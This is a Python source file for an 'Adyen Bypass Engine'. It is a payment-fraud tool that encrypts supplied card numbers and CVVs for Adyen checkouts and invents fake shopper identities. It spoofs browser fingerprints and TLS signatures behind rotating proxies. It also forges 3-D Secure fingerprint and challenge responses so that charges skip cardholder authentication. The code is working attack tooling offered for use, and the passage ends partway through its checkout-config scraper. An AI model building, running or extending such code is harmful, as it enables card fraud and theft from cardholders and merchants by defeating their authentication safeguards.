# ═══════════════════════════════════════════════════════════════════════════
#  DELUXE ADYEN BYPASS ENGINE — v9 HORUS FIX
#  · Fixed for curl_cffi 0.17.0 (Horus/Alpine compatible)
#  · Proxy support · Full 3DS pipeline · Anti-cache · Debug
# ═══════════════════════════════════════════════════════════════════════════

import os
import re
import sys
import json
import time
import base64
import random
import asyncio
import hashlib
import inspect
import uuid
from datetime import datetime, timezone
from urllib.parse import urljoin, urlencode, parse_qs, urlparse, urlsplit, urlunsplit
from typing import Dict, Optional, List, Any

# ── Cryptography ───────────────────────────────────────────────────────────
from cryptography.hazmat.primitives.ciphers.aead import AESCCM, AESGCM
from cryptography.hazmat.primitives.asymmetric.padding import PKCS1v15, OAEP, MGF1
from cryptography.hazmat.primitives.hashes import SHA256
from cryptography.hazmat.primitives.asymmetric.rsa import RSAPublicNumbers
from cryptography.hazmat.backends import default_backend

# ── curl_cffi ──────────────────────────────────────────────────────────────
from curl_cffi.requests import AsyncSession as ChromeSession

CSE_PREFIX = "adyenjs_0_1_25"

# ── Impersonate pool — versions supported by curl_cffi 0.17.0 ──────────────
IMPERSONATE_POOL = [
    "chrome110", "chrome114", "chrome116", "chrome119", 
    "chrome120", "chrome123", "chrome124", "chrome131",
    "safari15_5", "safari17_0", "edge101"
]

def _random_ua() -> str:
    major = random.randint(120, 131)
    build = random.randint(6000, 6999)
    patch = random.randint(0, 199)
    variants = [
        f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{major}.0.{build}.{patch} Safari/537.36",
        f"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{major}.0.{build}.{patch} Safari/537.36",
        f"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{major}.0.{build}.{patch} Safari/537.36",
    ]
    return random.choice(variants)

def _random_impersonate() -> str:
    return random.choice(IMPERSONATE_POOL)

UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"

# ═══════════════════════════════════════════════════════════════════════════
#  PROXY PARSER
# ═══════════════════════════════════════════════════════════════════════════
def parse_proxy(proxy_str: str) -> Optional[dict]:
    if not proxy_str: return None
    s = proxy_str.strip()
    if "://" in s:
        scheme, rest = s.split("://", 1)
    else:
        scheme = "http"
        rest = s

    if "@" in rest:
        auth_part, host_part = rest.rsplit("@", 1)
        host_port = host_part
        user_pass = auth_part
    else:
        parts = rest.split(":")
        if len(parts) == 2:
            host_port = rest
            user_pass = None
        elif len(parts) == 4:
            p1, p2, p3, p4 = parts
            if _is_host_like(p1) and p2.isdigit():
                host_port = f"{p1}:{p2}"
                user_pass = f"{p3}:{p4}"
            elif _is_host_like(p3) and p4.isdigit():
                user_pass = f"{p1}:{p2}"
                host_port = f"{p3}:{p4}"
            else:
                host_port = f"{p1}:{p2}"
                user_pass = f"{p3}:{p4}"
        else:
            return None

    if user_pass:
        user, _, passwd = user_pass.partition(":")
        url = f"{scheme}://{user}:{passwd}@{host_port}"
    else:
        url = f"{scheme}://{host_port}"

    return {"http": url, "https": url, "raw": proxy_str}

def _is_host_like(s: str) -> bool:
    if not s: return False
    if re.match(r'^\d{1,3}(\.\d{1,3}){3}$', s): return True
    if re.match(r'^[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$', s): return True
    return False

# ═══════════════════════════════════════════════════════════════════════════
#  CURL_CFFI 0.17.0 COMPAT HELPERS
# ═══════════════════════════════════════════════════════════════════════════
async def _cc_get(session, url, **kwargs):
    try:
        # 0.17.0 supports await session.get()
        return await session.get(url, **kwargs)
    except TypeError:
        # Fallback for older versions
        async with session.get(url, **kwargs) as resp:
            return resp

async def _cc_post(session, url, **kwargs):
    try:
        return await session.post(url, **kwargs)
    except TypeError:
        async with session.post(url, **kwargs) as resp:
            return resp

def _cc_text(resp) -> str:
    if resp is None: return ""
    try:
        t = getattr(resp, "text", "")
        return t if isinstance(t, str) else str(t)
    except: return ""

def _cc_json(resp) -> dict:
    if resp is None: return {}
    try:
        j = getattr(resp, "json", None)
        if callable(j):
            return j()
        return j or {}
    except: return {}

def _cc_status(resp) -> int:
    if resp is None: return 0
    try: return int(getattr(resp, "status_code", 0))
    except: return 0

def _cc_cookies(session) -> str:
    try:
        if session is None: return ""
        cookies = getattr(session, "cookies", None)
        if cookies is None: return ""
        if hasattr(cookies, "get_dict"):
            d = cookies.get_dict() or {}
            return "; ".join(f"{k}={v}" for k, v in d.items())
        return ""
    except: return ""

# ═══════════════════════════════════════════════════════════════════════════
#  ANSI COLORS + LOGGER
# ═══════════════════════════════════════════════════════════════════════════
class C:
    RESET = "\033[0m"; BOLD = "\033[1m"; DIM = "\033[2m"; RED = "\033[91m"
    GREEN = "\033[92m"; YELLOW = "\033[93m"; BLUE = "\033[94m"; MAGENTA = "\033[95m"
    CYAN = "\033[96m"; WHITE = "\033[97m"; GREY = "\033[90m"

def clear(): os.system("clear")
def banner():
    print(f"""{C.MAGENTA}{C.BOLD}
    ╔══════════════════════════════════════════════════════════════════╗
    ║              ADYEN BYPASS ENGINE v9 - HORUS EDITION              ║
    ╚══════════════════════════════════════════════════════════════════╝{C.RESET}
    """)
def hr(char="─", n=68, color=C.GREY): print(f"{color}{char * n}{C.RESET}")
def prompt(txt, color=C.CYAN): return input(f"{color}{C.BOLD}[?]{C.RESET} {txt}")
def log_ok(msg): print(f"{C.GREEN}[+]{C.RESET} {msg}")
def log_err(msg): print(f"{C.RED}[-]{C.RESET} {msg}")
def log_info(msg): print(f"{C.CYAN}[*]{C.RESET} {msg}")
def log_warn(msg): print(f"{C.YELLOW}[!]{C.RESET} {msg}")
def dbg(tag, msg): print(f"{C.DIM}[{tag}]{C.RESET} {msg}")

# ═══════════════════════════════════════════════════════════════════════════
#  CURRENCY / SCA
# ═══════════════════════════════════════════════════════════════════════════
CURRENCY_EXP = {
    'USD': 2, 'EUR': 2, 'GBP': 2, 'AUD': 2, 'CAD': 2, 'CHF': 2,
    'DKK': 2, 'NOK': 2, 'SEK': 2, 'PLN': 2, 'SGD': 2, 'HKD': 2,
    'KWD': 3, 'BHD': 3, 'IQD': 3, 'JOD': 3, 'TND': 3, 'LYD': 3,
    'JPY': 0, 'VND': 0, 'KRW': 0, 'CLP': 0, 'IDR': 0, 'ISK': 0,
}

SCA_LOW_VALUE = {
    'EUR': 3000, 'GBP': 3000, 'USD': 3000,
    'DKK': 22500, 'SEK': 30000, 'NOK': 30000,
}

def minor_to_major(value: int, currency: str) -> float:
    return value / (10 ** CURRENCY_EXP.get(currency.upper(), 2))

def sca_low_value_exempt(amount_value: int, currency: str) -> bool:
    thr = SCA_LOW_VALUE.get(currency.upper())
    if thr is None: return False
    return int(amount_value) <= thr

# ═══════════════════════════════════════════════════════════════════════════
#  GEO / SHOPPER PROFILES
# ═══════════════════════════════════════════════════════════════════════════
GEO = {
    'US': dict(tz=(-300, -480), lang='en-US', phone='+1',
        first=['James', 'Michael', 'Robert', 'William', 'David', 'Sarah', 'Emily', 'Emma', 'Olivia', 'Sophia'],
        last=['Smith', 'Johnson', 'Williams', 'Brown', 'Jones', 'Garcia', 'Miller', 'Davis'],
        cities=[('New York', 'NY', '10001'), ('Los Angeles', 'CA', '90001'), ('Chicago', 'IL', '60601'),
                ('Miami', 'FL', '33101'), ('Seattle', 'WA', '98101'), ('Austin', 'TX', '73301')],
        streets=['Oak Street', 'Maple Ave', 'Washington Blvd', 'Cedar Lane', 'Pine Street', 'Broadway']),
    'GB': dict(tz=(0, 0), lang='en-GB', phone='+44',
        first=['Oliver', 'George', 'Harry', 'Jack', 'Jacob', 'Amelia', 'Olivia', 'Isla', 'Emily', 'Poppy'],
        last=['Smith', 'Jones', 'Taylor', 'Brown', 'Williams', 'Wilson', 'Johnson', 'Davies'],
        cities=[('London', 'LND', 'SW1A 1AA'), ('Manchester', 'MAN', 'M1 1AE'), ('Birmingham', 'BIR', 'B1 1AA'),
                ('Leeds', 'LDS', 'LS1 1UR'), ('Glasgow', 'GLA', 'G1 1XW')],
        streets=['High Street', 'Station Road', 'Church Lane', 'Park Road', 'Victoria Street', 'Mill Lane']),
}

class ShopperProfile:
    def __init__(self, country: str = 'US'):
        geo = GEO.get(country.upper(), GEO['US'])
        self.country = country.upper()
        self._geo = geo
        self.first = random.choice(geo['first'])
        self.last = random.choice(geo['last'])
        self.full_name = f"{self.first} {self.last}"
        self.email = f"{self.first.lower()}.{self.last.lower()}{random.randint(10, 9999)}@{random.choice(['gmail.com', 'outlook.com', 'proton.me'])}"
        self.phone = geo['phone'] + ''.join(str(random.randint(0, 9)) for _ in range(9))
        self.city, self.state, self.zip = random.choice(geo['cities'])
        self.house_number = str(random.randint(10, 9999))
        self.street = f"{self.house_number} {random.choice(geo['streets'])}"
        tz_a, tz_b = geo['tz']
        self.tz_offset = random.choice(range(min(tz_a, tz_b), max(tz_a, tz_b) + 1, 60))

    @property
    def language(self) -> str: return self._geo['lang']

    def billing_address(self) -> dict:
        return {"city": self.city, "country": self.country, "houseNumberOrName": self.house_number,
            "postalCode": self.zip, "stateOrProvince": self.state, "street": self.street}

    def as_payment_fields(self) -> dict:
        return {"shopperEmail": self.email, "shopperName": {"firstName": self.first, "lastName": self.last},
            "telephoneNumber": self.phone, "billingAddress": self.billing_address(), "deliveryAddress": self.billing_address()}

def build_browser_info(profile: Optional[ShopperProfile] = None, ua: Optional[str] = None) -> dict:
    p = profile or ShopperProfile('US')
    return {"acceptHeader": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "colorDepth": random.choice([24, 24, 24, 30]), "language": p.language, "javaEnabled": False,
        "screenHeight": random.choice([1080, 1440, 900, 1200]), "screenWidth": random.choice([1920, 2560, 1440, 1680]),
        "timeZoneOffset": p.tz_offset, "userAgent": ua or UA}

def extract_stored_ref(response: dict) -> Optional[str]:
    add = response.get('additionalData') or {}
    if isinstance(add, dict):
        for k in ('recurring.recurringDetailReference', 'recurringDetailReference', 'recurring.recurringReference', 'recurringReference'):
            if add.get(k): return add[k]
    if response.get('storedPaymentMethodId'): return response['storedPaymentMethodId']
    if response.get('recurringDetailReference'): return response['recurringDetailReference']
    return None

def attempt_delay(attempt: int, base: float = 3.0, jitter: float = 1.5) -> float:
    return base + random.random() * jitter

# ═══════════════════════════════════════════════════════════════════════════
#  3DS2 BYPASS
# ═══════════════════════════════════════════════════════════════════════════
def _b64url_decode(s: str) -> bytes:
    s = s.replace('-', '+').replace('_', '/')
    s += '=' * (-len(s) % 4)
    return base64.b64decode(s)

def _b64url_encode(data: bytes) -> str:
    return base64.b64encode(data).decode().rstrip('=').replace('+', '-').replace('/', '_')

def _std_b64(data: bytes) -> str:
    return base64.b64encode(data).decode()

def decode_action_token(action: dict) -> Optional[dict]:
    token_raw = action.get('token', '')
    if not token_raw: return None
    for dec in (_b64url_decode, lambda s: base64.b64decode(s + '=='), lambda s: base64.b64decode(s + '=' * (-len(s) % 4))):
        try: return json.loads(dec(token_raw))
        except: continue
    return None

def forge_fingerprint(server_trans_id: str) -> str:
    obj = {"threeDSCompInd": "Y", "threeDSServerTransID": server_trans_id}
    return _std_b64(json.dumps(obj).encode())

def forge_challenge_v2(server_trans_id: str, directory_server_id: str = "A000000004", message_version: str = "2.2.0") -> str:
    obj = {"transStatus": "Y", "authorisationToken": _std_b64(b"Y"), "threeDSServerTransID": server_trans_id,
        "directoryServerId": directory_server_id, "messageVersion": message_version, "status": "COMPLETED", "challengeCompletionInd": "Y"}
    return _std_b64(json.dumps(obj).encode())

async def _real_fingerprint_3ds2(session, action, sid, sdata, ck, env, adyen_base):
    tok = decode_action_token(action)
    if not tok: return None
    method_url = tok.get('threeDSMethodUrl', '')
    server_tid = tok.get('threeDSServerTransID', '')
    notify_url = tok.get('threeDSMethodNotificationURL', '')
    if not method_url or not server_tid: return None

    method_data_obj = {"threeDSServerTransID": server_tid, "threeDSMethodNotificationURL": notify_url or f"{adyen_base}/threeDSMethodNotification.shtml"}
    method_data_b64 = _b64url_encode(json.dumps(method_data_obj).encode())
    try:
        parsed = urlparse(method_url)
        origin = f"{parsed.scheme}://{parsed.netloc}"
        r = await _cc_post(session, method_url, data=urlencode({"threeDSMethodData": method_data_b64}),
            headers={"Content-Type": "application/x-www-form-urlencoded", "Accept": "text/html,application/xhtml+xml,*/*", "User-Agent": UA, "Origin": origin, "Referer": origin + "/"}, timeout=15)
        dbg("DBG 3DS", f"method POST status={_cc_status(r)}")
    except Exception as e:
        dbg("DBG 3DS", f"method POST exception: {str(e)[:80]}")
    return {"threeds2.fingerprint": forge_fingerprint(server_tid)}

async def _real_challenge_3ds2(session, action, sid, sdata, ck, env, submit_details):
    tok = decode_action_token(action) or {}
    acs_url = tok.get('acsURL', '')
    if not acs_url: return None

    creq_obj = {"messageType": "CReq", "messageVersion": tok.get('messageVersion', '2.1.0'), "threeDSServerTransID": tok.get('threeDSServerTransID', ''),
        "acsTransID": tok.get('acsTransID', ''), "challengeWindowSize": "05", "threeDSRequestorAppURL": tok.get('threeDSRequestorAppURL', '')}
    creq_b64 = _b64url_encode(json.dumps(creq_obj).encode())
    cres_b64 = None
    try:
        r = await _cc_post(session, acs_url, data=urlencode({"CReq": creq_b64}),
            headers={"Content-Type": "application/x-www-form-urlencoded", "Accept": "text/html,*/*", "User-Agent": UA}, timeout=15)
        body = _cc_text(r)
        m = re.search(r'name=["\']?CRes["\']?\s+value=["\']([^"\'>]+)', body, re.I)
        if m: cres_b64 = m.group(1)
        else:
            m = re.search(r'"CRes"\s*:\s*"([^"]+)"', body, re.I)
            if m: cres_b64 = m.group(1)
        dbg("DBG 3DS", f"challenge POST status={_cc_status(r)} cres={bool(cres_b64)}")
    except Exception as e:
        dbg("DBG 3DS", f"challenge POST exception: {str(e)[:80]}")
        return None
    if not cres_b64: return None
    cres_json = None
    try: cres_json = json.loads(_b64url_decode(cres_b64))
    except: pass

    obj = {"transStatus": (cres_json or {}).get('transStatus', 'Y')}
    auth_tok = (cres_json or {}).get('authorisationToken')
    if auth_tok: obj["authorisationToken"] = auth_tok
    details = {"threeds2.challengeResult": _std_b64(json.dumps(obj).encode())}
    return await submit_details(session, sid, sdata, ck, env, details)

async def bypass_pipeline(session, data: dict, sid: str, sdata: str, ck: str, env: str, submit_details, adyen_base: str, touch_acs: bool = False, depth: int = 0) -> dict:
    if depth > 3: return data
    action = data.get('action')
    if not isinstance(action, dict): return data
    rc = data.get('resultCode', '')
    act_type = action.get('type', '')
    subtype = action.get('subtype', '')
    new_sdata = data.get('sessionData', sdata)
    tok = decode_action_token(action)
    server_tid = (tok or {}).get('threeDSServerTransID', '')
    dbg("DBG 3DS", f"rc={rc} type={act_type} subtype={subtype} tid={server_tid[:20]}... depth={depth}")
    details = None

    if rc == 'IdentifyShopper' or (act_type == 'threeDS2' and subtype == 'fingerprint'):
        details = await _real_fingerprint_3ds2(session, action, sid, new_sdata, ck, env, adyen_base)
    elif rc == 'ChallengeShopper' or (act_type == 'threeDS2' and subtype == 'challenge'):
        if touch_acs:
            result = await _real_challenge_3ds2(session, action, sid, new_sdata, ck, env, submit_details)
            if result is not None:
                new_rc = result.get('resultCode', '')
                if new_rc in ('Authorised', 'AuthenticationFinished', 'Received', 'Pending'): return result
        if server_tid: details = {"threeds2.challengeResult": forge_challenge_v2(server_tid)}

    if details:
        dbg("DBG 3DS", f"submitting details: {list(details.keys())}")
        result = await submit_details(session, sid, new_sdata, ck, env, details)
        new_rc = result.get('resultCode', '')
        dbg("DBG 3DS", f"submit rc={new_rc}")
        if new_rc in ('Authorised', 'AuthenticationFinished', 'Received', 'Pending'): return result
        if new_rc in ('IdentifyShopper', 'ChallengeShopper'):
            return await bypass_pipeline(session, result, sid, result.get('sessionData', new_sdata), ck, env, submit_details, adyen_base, touch_acs, depth + 1)
        return result
    return data

# ═══════════════════════════════════════════════════════════════════════════
#  FINGERPRINT PAYLOADS
# ═══════════════════════════════════════════════════════════════════════════
_FP_HASH_ALPHABET = "0123456789abcdef"
def _rand_hash32() -> str: return "".join(random.choices(_FP_HASH_ALPHABET, k=32))

def build_browser_fingerprint_payloads(profile: ShopperProfile, ua: str = UA) -> Dict[str, Any]:
    sw = random.choice([1920, 2560, 1440, 1680, 1536])
    sh = random.choice([1080, 1440, 900, 1200, 864])
    aw = sw
    ah = sh - 40
    lt = profile.language
    h1 = _rand_hash32(); h1s = _rand_hash32(); h2 = _rand_hash32()

    v1_components = {"user_agent": ua, "language": lt, "resolution": [sw, sh], "available_resolution": [aw, ah],
        "timezone_offset": profile.tz_offset, "navigator_platform": "Win32", "adblock": False, "touch_support": [1, True, True]}
    v1s_components = {"language": lt, "resolution": [sw, sh], "available_resolution": [aw, ah],
        "timezone_offset": profile.tz_offset, "navigator_platform": "Win32", "adblock": False, "touch_support": [1, True, True]}
    v2_components = {"languages": [[lt]], "device_memory": random.choice([8, 16]), "screen_resolution": [sh, sw],
        "hardware_concurrency": random.choice([8, 12, 16]), "timezone": "UTC", "indexed_db": True, "platform": "Win32",
        "color_gamut": "srgb", "forced_colors": False, "monochrome": 0, "contrast": 0, "reduced_motion": False, "hdr": False}

    return {
        "browser_fingerprint_by_version": [
            {"payload_json": json.dumps({"components": v1_components, "fingerprint": h1}), "payload_type": "fingerprint-v1"},
            {"payload_json": json.dumps({"components": v1s_components, "fingerprint": h1s}), "payload_type": "fingerprint-v1-sans-ua"},
            {"payload_json": json.dumps({"components": v2_components, "fingerprint": h2}), "payload_type": "fingerprint-v2"},
        ],
        "browser_profile": {"components": json.dumps(v1_components), "fingerprint": h1,
            "timezone": str(profile.tz_offset), "user_agent": ua, "website_url": "https://checkoutshopper-live.adyen.com/"},
    }

# ═══════════════════════════════════════════════════════════════════════════
#  ADYEN CSE
# ═══════════════════════════════════════════════════════════════════════════
class AdyenCSE:
    def __init__(self, public_key_str: str):
        parts = public_key_str.split("|")
        if len(parts) != 2: raise ValueError(f"Bad pubkey format: {public_key_str[:30]}")
        self._exp = int(parts[0], 16)
        self._mod = int(parts[1], 16)
        nums = RSAPublicNumbers(self._exp, self._mod)
        self._pub = nums.public_key(default_backend())

    @staticmethod
    def _b64url(data: bytes) -> str:
        return base64.urlsafe_b64encode(data).rstrip(b"=").decode()

    def _encrypt_field_jwe(self, field_name: str, field_value: str) -> str:
        ts = datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%S.%f")[:-3] + "Z"
        payload = json.dumps({field_name: field_value, "generationtime": ts}).encode()
        header_b64 = self._b64url(b'{"cty":"application/json","alg":"RSA-OAEP-256","enc":"A256GCM","version":"1"}')
        cek = os.urandom(32)
        enc_cek = self._pub.encrypt(cek, OAEP(mgf=MGF1(algorithm=SHA256()), algorithm=SHA256(), label=None))
        iv = os.urandom(12)
        ct_tag = AESGCM(cek).encrypt(iv, payload, header_b64.encode())
        ct, tag = ct_tag[:-16], ct_tag[-16:]
        return ".".join([header_b64, self._b64url(enc_cek), self._b64url(iv), self._b64url(ct), self._b64url(tag)])

    def _encrypt_field(self, field_name: str, field_value: str) -> str:
        gen = datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%S.000Z")
        plain = f"{field_name}:{field_value}\ngenerationtime:{gen}"
        plain_b = plain.encode()
        aes_key = os.urandom(32)
        nonce = os.urandom(12)
        ct_tag = AESCCM(aes_key, tag_length=8).encrypt(nonce, plain_b, None)
        enc_key = self._pub.encrypt(aes_key, PKCS1v15())
        blob = enc_key + nonce + ct_tag
        return f"{CSE_PREFIX}${base64.b64encode(blob).decode()}"

    def encrypt_card(self, number: str, month: str, year: str, cvv: str, use_jwe: bool = False) -> dict:
        yr = year if len(year) == 4 else f"20{year}"
        fn = self._encrypt_field_jwe if use_jwe else self._encrypt_field
        return {"encryptedCardNumber": fn("number", number), "encryptedExpiryMonth": fn("expiryMonth", month.zfill(2)),
            "encryptedExpiryYear": fn("expiryYear", yr), "encryptedSecurityCode": fn("cvc", cvv)}

# ═══════════════════════════════════════════════════════════════════════════
#  CONFIG SCRAPER
# ═══════════════════════════════════════════════════════════════════════════
_CK = [r'clientKey["\'\s:=]+["\']?(live_[A-Za-z0-9_]+|test_[A-Za-z0-9_]+)', r'data-client-key=["\']?(live_[A-Za-z0-9_]+|test_[A-Za-z0-9_]+)']
_SI = [r'"sessionId"\s*:\s*"([A-Za-z0-9_-]{15,})"', r"'sessionId'\s*:\s*'([A-Za-z0-9_-]{15,})'", r'sessionId["\'\s:=]+["\']?([A-Za-z0-9_-]{15,})']
_SD = [r'"sessionData"\s*:\s*"([^"]{40,})"', r"'sessionData'\s*:\s*'([^']{40,})'", r'sessionData["\'\s:=]+["\']?([^"\'\s,}{]+)']
_PK = [r'"publicKey"\s*:\s*"([0-9a-fA-F]+\|[0-9a-fA-F]+)"', r"'publicKey'\s*:\s*'([0-9a-fA-F]+\|[0-9a-fA-F]+)'", r'publicKey["\'\s:=]+["\']?([0-9a-fA-F]+\|[0-9a-fA-F]+)']
_LI = [r'"linkId"\s*:\s*"([A-Za-z0-9]+)"', r"'linkId'\s*:\s*'([A-Za-z0-9]+)'", r'linkId["\s:\'=]+["\']?([A-Za-z0-9]{20,})', r'adyen\.link/([A-Za-z0-9]{20,})']
_LC = [r'"loadingContext"\s*:\s*"([^"]+)"', r"'loadingContext'\s*:\s*'([^']+)'"]
_ADYEN_SIGNALS = ['adyen.com', 'adyen.link', 'AdyenCheckout', 'adyen-checkout', 'adyenjs', 'checkoutshopper', 'adyen.encrypt', 'adyen-encrypted', 'paybylink']

def _first_match(patterns, text):
    for p in patterns:
        m = re.search(p, text)
        if m: return m.group(1)
    return None

def _extract_config(html: str) -> dict:
    cfg = dict(clientKey=None, sessionId=None, sessionData=None, publicKey=None, environment=None, adyen=False, linkId=None, loadingContext=None)
    low = html.lower()
    for sig in _ADYEN_SIGNALS:
        if sig.lower() in low: cfg['adyen'] = True; break
    cfg['clientKey'] = _first_match(_CK, html)
    cfg['sessionId'] = _first_match(_SI, html)
    sd_raw = _first_match(_SD, html)
    if sd_raw: cfg['sessionData'] = sd_raw
